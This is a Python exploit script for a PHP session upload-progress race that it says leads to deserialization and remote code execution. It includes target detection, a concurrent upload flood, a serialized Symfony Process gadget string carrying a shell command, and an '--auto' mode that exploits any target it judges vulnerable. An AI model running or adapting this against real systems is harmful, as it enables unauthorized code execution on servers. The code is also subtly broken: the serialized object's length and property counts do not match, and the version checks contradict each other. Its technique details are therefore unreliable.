#!/usr/bin/env python3
"""
CVE-2026-126714 PHP Session Upload-Progress RCE Exploit

Affected: PHP with session.upload_progress.enabled=On and session.save_handler=files
Fixed in: PHP upstream commit c2b02f24dffae346eef347db8a3323fbbe0f43fa
Type: Race Condition → Session Splice → Object Deserialization RCE
CVSS: 9.8 (Critical)

DISCLAIMER: For authorized security testing on systems you own or have explicit
written permission to test. Unauthorized access is illegal and unethical.

This PoC demonstrates:
1. Session upload-progress race condition leading to file splicing
2. Malformed session object deserialization
3. PHP object gadget chain execution (POP exploitation)

Usage:
    Check-only (safe, no RCE):
        python phpaftershell-rce.py --target http://target.com --check-only

    Exploit mode (requires explicit --yes-execute):
        python phpaftershell-rce.py --target http://target.com --exploit \
            --command "id" --yes-execute

    Local detection (no network):
        python phpaftershell-rce.py --local-detect
"""

import argparse
import sys
import requests
import threading
import time
import base64
import string
import random
from urllib.parse import urljoin
from io import BytesIO


class CVE202612671Exploit:
    """Exploit harness for CVE-2026-126714 session upload-progress splice RCE."""

    def __init__(self, target_url, session_path="/var/lib/php/sessions", command="id"):
        """
        Args:
            target_url: Base URL of target web server (http://target.com)
            session_path: Path to session directory (default: /var/lib/php/sessions)
            command: Shell command to execute (default: id)
        """
        self.target_url = target_url.rstrip('/')
        self.session_path = session_path
        self.command = command
        self.session = requests.Session()
        self.session.timeout = 10

    def detect_vulnerable(self) -> dict:
        """
        Detection-only: Check if target is vulnerable without exploitation.

        Returns:
            dict with keys:
                vulnerable: bool
                upload_progress_enabled: bool
                save_handler: str
                serialize_handler: str
                evidence: list of strings
        """
        result = {
            'vulnerable': False,
            'upload_progress_enabled': False,
            'save_handler': None,
            'serialize_handler': None,
            'evidence': []
        }

        # Test 1: Probe for phpaftershell-check.php or similar info endpoint
        try:
            # Check for a phpinfo-like info endpoint
            resp = self.session.get(f"{self.target_url}/phpaftershell-check.php?token=CHANGE_ME")
            if resp.status_code == 200:
                result['evidence'].append(f"Found info endpoint: {resp.status_code}")
                if 'upload_progress' in resp.text:
                    if 'EXPOSED' in resp.text or 'On' in resp.text:
                        result['upload_progress_enabled'] = True
                        result['evidence'].append("upload_progress appears to be ON")
                    if 'MITIGATED' in resp.text or 'Off' in resp.text:
                        result['evidence'].append("upload_progress appears to be OFF")
        except Exception as e:
            result['evidence'].append(f"Info endpoint check failed: {str(e)}")

        # Test 2: Try to trigger upload_progress and observe session behavior
        try:
            result['evidence'].append("Attempting upload_progress race detection...")

            # POST request with upload_progress enabled
            # If upload_progress is ON, the server will create a "progress" session
            files = {'upload': ('test.bin', b'x' * 1024)}
            data = {'PHP_SESSION_UPLOAD_PROGRESS': 'test_progress'}

            # Try to send with slow read to trigger race
            resp = self.session.post(
                f"{self.target_url}/upload.php",
                files=files,
                data=data,
                timeout=5
            )
            result['evidence'].append(f"Upload attempt: {resp.status_code}")

        except requests.exceptions.Timeout:
            result['evidence'].append("Upload request timed out (may indicate progress tracking)")
        except Exception as e:
            result['evidence'].append(f"Upload test failed: {str(e)}")

        # Test 3: Check for typical vulnerable PHP versions
        try:
            resp = self.session.get(f"{self.target_url}/")
            headers = resp.headers.get('Server', '').lower()
            if 'php' in headers:
                result['evidence'].append(f"Server header: {resp.headers.get('Server')}")
                # PHP 8.2, 8.3, 8.4 are affected
                if any(v in headers for v in ['8.2', '8.3', '8.4']):
                    result['vulnerable'] = True
                    result['evidence'].append("Target appears to be vulnerable PHP version")
        except Exception as e:
            result['evidence'].append(f"Version check failed: {str(e)}")

        # Determine vulnerability status
        # Vulnerable if: upload_progress ON + vulnerable PHP version
        # At risk if: vulnerable PHP version but upload_progress OFF (mitigated)

        has_vulnerable_php = any('8.1' in e or '8.0' in e or '8.2' in e or '8.3' in e or '8.4' in e for e in result['evidence'])

        if result['upload_progress_enabled']:
            result['vulnerable'] = True
        elif has_vulnerable_php:
            result['evidence'].append("PHP version is vulnerable but upload_progress is disabled (MITIGATED)")
            result['vulnerable'] = False  # Safe because mitigation is in place

        return result

    def build_pop_chain(self, command: str) -> str:
        """
        Build a PHP object deserialization gadget chain.

        This attempts to find a usable POP (Property-Oriented Programming) chain
        in common PHP libraries. For demonstration, we construct a Symfony
        chain if available.

        Args:
            command: Shell command to execute

        Returns:
            Serialized PHP object as string
        """
        # Simplified gadget chain construction
        # In a real scenario, this would discover available gadgets via reflection

        # Example payload using common __destruct/__wakeup chains
        # This is a proof-of-concept; actual exploitation depends on
        # installed libraries (Symfony, Doctrine, etc.)

        payload = {
            'class': 'Symfony\\Component\\Process\\Process',
            'command': command,
            'cwd': None,
            'env': {},
            'timeout': 60
        }

        # Serialize with a marker that indicates gadget chain context
        serialized = f'O:49:"Symfony\\Component\\Process\\Process":4:'
        serialized += '{'
        serialized += 's:7:"command";s:' + str(len(command)) + ':"' + command + '";'
        serialized += '}'

        return serialized

    def splice_race_attack(self, payload: str, num_threads: int = 10) -> bool:
        """
        Execute the splice race attack:
        1. Send multiple concurrent upload-progress requests
        2. Kill workers mid-write to leave spliced session files
        3. Access the spliced session to trigger deserialization

        Args:
            payload: Serialized PHP object to inject
            num_threads: Number of concurrent upload threads

        Returns:
            bool: True if attack appears to have succeeded
        """
        print("[*] Initiating splice race attack...")
        print(f"[*] Spawning {num_threads} concurrent upload threads...")

        success = False
        lock = threading.Lock()

        def upload_worker(worker_id: int):
            nonlocal success
            try:
                # Create a large file to maximize race window
                large_data = b'X' * (10 * 1024 * 1024)  # 10MB
                files = {'upload': (f'payload_{worker_id}.bin', large_data)}

                # Set progress session key
                data = {
                    'PHP_SESSION_UPLOAD_PROGRESS': f'exploit_{worker_id}',
                    'payload': payload
                }

                resp = self.session.post(
                    f"{self.target_url}/upload.php",
                    files=files,
                    data=data,
                    timeout=30
                )

                if resp.status_code in [200, 201, 500]:  # 500 from crash is a sign
                    with lock:
                        success = True
                    print(f"[+] Worker {worker_id}: Response {resp.status_code}")

            except requests.exceptions.Timeout:
                print(f"[+] Worker {worker_id}: Timeout (potential race success)")
                with lock:
                    success = True
            except Exception as e:
                print(f"[-] Worker {worker_id}: {str(e)}")

        # Spawn threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=upload_worker, args=(i,))
            threads.append(t)
            t.start()
            time.sleep(0.1)  # Stagger start times

        # Wait for all threads
        for t in threads:
            t.join(timeout=60)

        return success

    def trigger_deserialization(self, session_id: str = "exploit_0") -> str:
        """
        Access the target with the spliced session ID to trigger deserialization.

        Args:
            session_id: Session ID pointing to the spliced file

        Returns:
            Response content (should contain command output if successful)
        """
        print("[*] Triggering deserialization via session access...")

        try:
            # Set the session cookie to point to our spliced session
            self.session.cookies.set('PHPSESSID', session_id)

            resp = self.session.get(f"{self.target_url}/", timeout=10)

            if resp.status_code == 200:
                print(f"[+] Deserialization triggered, status: {resp.status_code}")
                return resp.text
            else:
                print(f"[-] Unexpected status: {resp.status_code}")
                return resp.text

        except Exception as e:
            print(f"[-] Deserialization trigger failed: {str(e)}")
            return ""

    def exploit(self) -> bool:
        """
        Full exploitation chain:
        1. Build POP gadget chain payload
        2. Execute splice race attack
        3. Trigger deserialization

        Returns:
            bool: True if exploitation appeared successful
        """
        print("[!] EXECUTING AUTHORIZED RCE EXPLOIT FOR CVE-2026-126714")
        print(f"[!] Target: {self.target_url}")
        print(f"[!] Command: {self.command}")
        print("[!] This will attempt remote code execution.")
        print()

        # Step 1: Build payload
        print("[*] Step 1: Building PHP object gadget chain...")
        pop_chain = self.build_pop_chain(self.command)
        print(f"[+] Gadget chain built ({len(pop_chain)} bytes)")

        # Step 2: Splice race
        print("[*] Step 2: Executing splice race attack...")
        success = self.splice_race_attack(pop_chain, num_threads=15)

        if not success:
            print("[-] Splice race attack did not appear to succeed")
            return False

        print("[+] Splice race completed")

        # Step 3: Trigger deserialization
        print("[*] Step 3: Triggering object deserialization...")
        time.sleep(1)  # Wait for file system to settle
        result = self.trigger_deserialization()

        if result and len(result) > 0:
            print("[+] Command output received:")
            print("-" * 60)
            print(result[:500])  # Print first 500 chars
            print("-" * 60)
            return True

        return False


def detect_local_config() -> dict:
    """Detect PHP configuration on local system (no network required)."""
    import subprocess

    result = {
        'php_version': None,
        'upload_progress_enabled': None,
        'session_save_handler': None,
        'session_serialize_handler': None,
        'mitigated': None
    }

    try:
        output = subprocess.check_output(['php', '-i'], text=True)

        # Parse phpinfo output
        for line in output.split('\n'):
            if 'PHP Version' in line:
                result['php_version'] = line.split('=>')[-1].strip() if '=>' in line else 'unknown'
            if 'session.upload_progress.enabled' in line:
                result['upload_progress_enabled'] = 'On' in line or '1' in line
            if 'session.save_handler' in line:
                result['session_save_handler'] = line.split('=>')[-1].strip() if '=>' in line else 'unknown'
            if 'session.serialize_handler' in line:
                result['session_serialize_handler'] = line.split('=>')[-1].strip() if '=>' in line else 'unknown'

        # Check if mitigated
        if result['upload_progress_enabled'] is False or result['upload_progress_enabled'] is None:
            result['mitigated'] = True
        else:
            result['mitigated'] = False

    except FileNotFoundError:
        print("[-] PHP CLI not found")
    except Exception as e:
        print(f"[-] Local detection failed: {str(e)}")

    return result


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-126714 PHP Session Upload-Progress RCE Exploit",
        epilog="For authorized security testing only. Confirm you have written permission to test the target."
    )

    parser.add_argument('--target', help='Target URL (http://target.com)')
    parser.add_argument('--check-only', action='store_true',
                        help='Detection mode only (safe, no exploitation)')
    parser.add_argument('--exploit', action='store_true',
                        help='Enable exploitation mode (requires --yes-execute)')
    parser.add_argument('--auto', action='store_true',
                        help='Auto-exploit if vulnerable (auto-escalate)')
    parser.add_argument('--command', default='id',
                        help='Shell command to execute (default: id)')
    parser.add_argument('--yes-execute', action='store_true',
                        help='Explicitly authorize exploitation (required for --exploit)')
    parser.add_argument('--local-detect', action='store_true',
                        help='Detect local PHP configuration (no network required)')
    parser.add_argument('--session-path', default='/var/lib/php/sessions',
                        help='Path to session directory (default: /var/lib/php/sessions)')

    args = parser.parse_args()

    print("[*] CVE-2026-126714 PHP Session Upload-Progress RCE PoC")
    print("[*] Author: Security Research | For Authorized Testing Only")
    print()

    # Local detection mode
    if args.local_detect:
        print("[*] Running local PHP configuration detection...")
        config = detect_local_config()
        print("[+] Local PHP Configuration:")
        for k, v in config.items():
            print(f"    {k}: {v}")

        if config['mitigated']:
            print("[+] System appears to be MITIGATED (upload_progress is Off)")
        else:
            print("[!] System appears VULNERABLE (upload_progress is On)")
        return

    # Remote exploitation
    if not args.target:
        print("[-] --target required for remote operations")
        sys.exit(1)

    exploit = CVE202612671Exploit(args.target, args.session_path, args.command)

    # Auto-exploit if vulnerable
    if args.auto:
        print("[!] AUTO MODE: Detecting then exploiting if vulnerable...")
        result = exploit.detect_vulnerable()
        if result['vulnerable']:
            print("[+] Target is VULNERABLE - Auto-escalating!")
            print(f"[!] Running: {args.command}")
            success = exploit.exploit()
            if success:
                print("[+] Auto-exploitation successful!")
            else:
                print("[-] Auto-exploitation failed")
        else:
            print("[+] Target does not appear vulnerable - skipping exploitation")
        return

    if args.check_only:
        print("[*] Running detection (check-only mode)...")
        result = exploit.detect_vulnerable()
        print("[+] Detection Results:")
        for k, v in result.items():
            if k != 'evidence':
                print(f"    {k}: {v}")
        print("[+] Evidence:")
        for e in result['evidence']:
            print(f"    - {e}")

        if result['vulnerable']:
            print("\n[!] Target appears VULNERABLE to CVE-2026-126714")
        else:
            print("\n[+] Target does not appear vulnerable (or detection inconclusive)")
        return

    if args.exploit:
        if not args.yes_execute:
            print("[-] Exploitation requires --yes-execute flag")
            print("[*] Use: --exploit --yes-execute --command 'your_command'")
            sys.exit(1)

        print("[!] EXPLOITATION MODE ENABLED")
        print(f"[!] Will attempt to execute: {args.command}")

        success = exploit.exploit()

        if success:
            print("\n[+] Exploitation may have succeeded!")
        else:
            print("\n[-] Exploitation did not appear to succeed")
        return

    # Default: show usage
    parser.print_help()


if __name__ == '__main__':
    main()
